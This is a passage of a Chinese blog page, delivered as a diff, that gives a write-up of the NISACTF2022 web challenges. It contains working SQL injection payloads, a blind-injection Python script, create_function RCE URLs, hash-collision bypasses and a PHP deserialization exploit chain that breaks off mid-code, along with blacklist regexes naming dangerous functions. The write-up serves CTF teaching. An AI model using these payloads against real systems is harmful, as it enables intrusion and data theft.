@@ -1,0 +1,734 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    Guwaneme
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="Guwaneme CTF" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Guwaneme</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/categories/CTF/">/CTF/</a></li><li><a class="category-link" href="/categories/Crypto/">/Crypto/</a></li><li><a class="category-link" href="/categories/Daily/">/Daily/</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="友链">
+		                友链
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图图">
+		                图图
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/Guwaneme" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(https://raw.githubusercontent.com/guwaneme/img/master/img/image-20220405235550070.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >NISACTF2022wp</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <p> （文章配图没有问题，请连接vpn，图床基于github，需要翻墙）</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272327308.png" alt="img"></p>
+<p>一进题目就看的出来是个“简简单单”的源码审计题，不过其中还是暗藏玄机的 </p>
+<p>我们选中前边的“NISACTF……等字符时，发现后边的字符也被跟着选中了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272328154.png" alt="img"></p>
+<p>这其中一定有一些不可见字符在作怪</p>
+<p>将全部代码选中复制粘贴到本地，用010editor打开发现秘密</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272329490.png" alt="img"></p>
+<p>原先的$_GET[cuishiyuan]变成了图中这一串奇奇怪怪的玩意，也就是变量名变为了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E</span><br></pre></td></tr></table></figure>
+
+<p>同样的，变量值也不再是”NISACTF“</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272330686.png" alt="img"></p>
+<p>原因是因为E280AE、E281A6、E281A9这三个特殊的unicode字符，<a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/22d50835.html#%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90">具体原理剖析查看这篇博客</a></p>
+<p>最终的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6%55%67%65%69%77%6F%E2%81%A9%E2%81%A6%63%75%69%73%68%69%79%75%61%6E=%E2%80%AE%E2%81%A6%20%46%6C%61%67%21%E2%81%A9%E2%81%A6%4E%31%53%41%43%54%46</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272333002.png" alt="img"></p>
+<p>得到robots.txt信息，访问得到level2路径</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272332582.png" alt="img"></p>
+<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272332125.png" alt="img"></p>
+<p>考察md5强比较，直接网上随便搜一对绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272333865.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272334098.png" alt="img"></p>
+<p>同上题一样，只不过考的是sha1的强比较绕过，直接payload打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272334418.png" alt="img"></p>
+<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272335572.png" alt="img"></p>
+<p>乍一看，考的好像是php字符串解析特性，不过黑名单那里把空格和点号都给禁用了，那剩下的就只有’ [ ‘号了，但是如果构造 NI[SA[ 这个参数的话还是行不通的，因为php在遇到两个’ [ ‘号时，只会把第一个’ [ ‘号转换为’ _ ‘，而第二个不会转换（具体原因看看php源码就知道了，Y4tacker师傅博客有写）</p>
+<p>所以此题转换一下思路，利用parse_url的函数缺陷，在遇到严重的url不标准时，parse_url函数会返回NULL，即可绕过黑名单限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://1.14.71.254:28023///level_level_4.php?NI_SA_=txw4ever</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272335141.png" alt="img"></p>
+<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><p>其实这个level也是后加的了，本着这题都是（超）老考点的集合，就干脆再加个老考点了，源码取自p神的code_breaking2018的function那题，老考点了就不多说了，直接利用create_function注入达到RCE目的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28068/55_5_55.php?a=\create_function&amp;b=&#125;;print_r(scandir(&#x27;/&#x27;));//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272349285.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28068/55_5_55.php?a=\create_function&amp;b=&#125;;readfile(&#x27;/flag&#x27;);//</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272350486.png" alt="img"></p>
+<h3 id="join-us"><a href="#join-us" class="headerlink" title="join-us"></a>join-us</h3><p>进入题目后在登录页面发现sql注入点，输入1’报错，输出1‘# 正常</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272350084.png" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272350264.png" alt="img"></p>
+<p>此题设有waf，fuzz一下，这里可能对or关键字会有错误判断，可能一些师傅们fuzz出来发现or是可用的，但是构造语句时又发现被waf拦住了，其实后端对or是过滤了的，但又没完全过滤（啪），这里直接贴源码解决一下一些师傅们的疑惑</p>
+<p>(不过后来看师傅们都没解出来，就hint直接说了用 || 构造了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = &quot;union|left|right|and|by|if|\&amp;|sleep|floor|substr|ascii|=|\&quot;|benchmark|as|column|insert|update|or &quot;;//有空格</span><br></pre></td></tr></table></figure>
+
+<p>fuzz结束，准备注入，黑名单中没有看到extractvalue()函数，可以一试，再看看黑名单，发现留了个 || 符号，那注入语句就可以写成 -1’ || extractvalue(内容构造)# 了</p>
+<p>注表名（等于号被禁了，用like代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like database())))#</span><br></pre></td></tr></table></figure>
+
+<p>这里发现被waf挡住了，其实是因为as被禁了，database含有这俩字母了，那该怎么获取库名呢</p>
+<p>其实转换一下思路就会发现库名很容易获得，我们一开始输入的 1’ 回显了报错，那我们是不是可以利用回显的报错来获取到库名呢，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || (select*from aa)#    或者你一定要用or也可以</span><br><span class="line">-1&#x27; or(select*from aa)#</span><br><span class="line">//aa为不存在的表名</span><br></pre></td></tr></table></figure>
+
+<p>发现回显了这个，那库名一下就到手了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272353341.png" alt="img"></p>
+<p>(当然用schemata也行)</p>
+<p>库名到手后还得16进制转一下，得到如下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 0x73716c73716c)))#</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272354273.png" alt="img"></p>
+<p>终于注出表名，接下来column关键字被禁，想到无列名注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))#</span><br></pre></td></tr></table></figure>
+
+<p>得到<img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272355245.png" alt="img"></p>
+<p>然后直接在这里边select就行了，flag没回显全的mid函数截一下就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; || extractvalue(1,concat(0x7e,(select data from output)))#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那在无列名注入的地方还有两个点</p>
+<p>第一个是第一个表名Fal_flag就是引诱大家先去注这个表，然后注到第三个字段才发现自己上当了，flag在另一个表（不知道大家有没有被骗到，^_^）</p>
+<p><img src="https://uploader.shimo.im/f/THW5345klou21fLc.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJhY2Nlc3NfcmVzb3VyY2UiLCJleHAiOjE2NDgzOTY4MzEsImciOiJWaHZkR2tWSHRrRDhyd0hSIiwiaWF0IjoxNjQ4Mzk2NTMxLCJ1c2VySWQiOjcyNjM1MzQzfQ.hhaBq2XakQK7ziuR0w96lDRrO9lrhwFR3HCjmv06mbs" alt="img"></p>
+<p>第二个点就是前边也提到的对于as的过滤，大家都知道常见的对表起一个新名字有三种方式，一种是加个括号再加个名，如 (select*from output)c 那这个查询的结果内容就被归整为一个叫做“c”的表中；第二种就是直接用as，如 select output as a 那此时这个output就不叫output了，他叫 “a”；第三种就是这个as可以忽略，也是本题想考到的一个小小知识点，小小小吧，小小小小，….. fine，当常识就好了</p>
+<h3 id="hardsql"><a href="#hardsql" class="headerlink" title="hardsql"></a>hardsql</h3><p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272356627.png" alt="img"></p>
+<p>首先如果登录名不为’bilala‘，则会alert弹窗</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272358635.png" alt="img"></p>
+<p>接下来就是靠着题目描述给的句子开始注了，先fuzz一下查看过滤（这里直接贴源码了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/if|regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|insert|database|reverse|update|extractvalue|floor|join|substr|&amp;|;|\\\$|char|\x0a|\x09|column|sleep|\ /i</span><br></pre></td></tr></table></figure>
+
+<p>过滤的好像有亿点点多，看似好像除了union注入，别的几种常见注入都被ban了，那其实呢，sql句子给出的重点不是查询（毕竟这种查询语句猜都能猜的出），故意给出的信息是表名和列名，有了这个列名那注入直接就简单了起来，利用如下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=-1&#x27;/**/or/**/passwd/**/like/**/&#x27;a%&#x27;#</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再根据注入错误时返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272357935.png" alt="img"></p>
+<p>成功时返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/NISASec/blog_image/img/202203272357146.png" alt="img"></p>
+<p>盲注脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://124.221.24.137:28655/login.php&quot;</span><br><span class="line">str = &quot;bqwertyuiopasdfghjklzxcvnm0123456789&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 40):</span><br><span class="line">    for j in str:</span><br><span class="line">        payload = &quot;-1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#&quot;.format(flag + j)</span><br><span class="line">        data = &#123;&#x27;username&#x27;: &#x27;bilala&#x27;, &#x27;passwd&#x27;: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        print(&#x27;[*]going&#x27;)</span><br><span class="line">        if &quot;wrong password&quot; in res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>最终得到密码：b2f2d15b3ae082ca29697d8dcd420fd7</p>
+<p>登录进去后看到源码，在源码中看到了刚刚的判断逻辑，这里重点关注flag处的判断条件了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if ($row[&#x27;passwd&#x27;] === $password) &#123;</span><br><span class="line">        if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123;</span><br><span class="line">            show_source(__FILE__);</span><br><span class="line">            die;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die($FLAG);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题改自赛题，那做过的师傅一下就知道考Quine了，至于没做过的师傅可以参考[2021 第五空间]yet_another_mysql_injection这题</p>
+<p>当然这题在Quine这里也是稍微改了下的，原题是禁用了0x，放出了char，而在Quine中，这两个是可以互相替代的，所以此题禁用了char，放出0x，payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=bilala&amp;passwd=&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>(ps：（赛后写的）擦，又被非预期，char和chr是同个函数，哇擦，太菜了5555，还得再多磨练磨练=.=</p>
+<h3 id="babyserialize"><a href="#babyserialize" class="headerlink" title="babyserialize"></a>babyserialize</h3><p><del>waf忘记加大小写限制了。。。直接当摆设了</del></p>
+<p><del>eval是真的危险，过滤不严直接被各种非预期了，555</del></p>
+<p>原意是想考察对php原生类的利用的</p>
+<p>源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun==&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun=$val[0];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun=$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb = $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name=$value;</span><br><span class="line">        if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;ser&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;ser&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//func checkcheck($data)&#123;</span><br><span class="line">//  if(preg_match(......))&#123;</span><br><span class="line">//      die(something wrong);</span><br><span class="line">//  &#125;</span><br><span class="line">//&#125;</span><br><span class="line">//function hint()&#123;</span><br><span class="line">//    echo &quot;.......&quot;;</span><br><span class="line">//    die();</span><br><span class="line">//&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>链子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei::__wakeup() --&gt; Ilovetxw::__call() --&gt; four::__set() --&gt; Ilovetxw::__toString() --&gt; NISA::__invoke()</span><br></pre></td></tr></table></figure>
+
+<p>hint就是说flag在根目录</p>
+<p>eval处加了过滤，过滤了一些常用的危险的PHP函数，system、file相关的、exec，glob以及一些写马的操作等等</p>
+<p>waf如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\`|\||\^|\~|assert|\?|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\_|disk/</span><br></pre></td></tr></table></figure>
+
+<p>想考察的还是大家对于php原生类的了解利用</p>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">&#125;</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">&#125;</span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$N1 = new NISA();</span><br><span class="line">$N1-&gt;fun = &quot;txw&quot;;</span><br><span class="line">$N1-&gt;txw4ever = &quot;echo new GlobIterator(\&quot;/f*\&quot;);&quot;;</span><br><span class="line">$I1 = new Ilovetxw();</span><br><span class="line">$I1-&gt;su = $N1;</span><br><span class="line">$f1 = new four();</span><br><span class="line">$f1-&gt;a = $I1;</span><br><span 